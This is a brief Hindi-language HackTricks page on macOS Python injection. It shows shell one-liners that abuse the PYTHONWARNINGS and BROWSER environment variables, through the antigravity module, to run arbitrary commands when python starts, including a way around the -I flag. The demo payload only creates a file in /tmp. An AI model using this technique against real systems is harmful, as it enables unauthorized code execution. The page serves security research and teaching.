# macOS Python Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` और `BROWSER` env variables के माध्यम से

जब भी python को call किया जाता है, तब arbitrary code execute करने के लिए दोनों environment variables को बदलना संभव है, उदाहरण के लिए:<sup>[[1]](#references)</sup>
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## संदर्भ

- [1] [Environment Variables के साथ Hacking - elttam](https://www.elttam.com/blog/env/)

{{#include ../../../banners/hacktricks-training.md}}
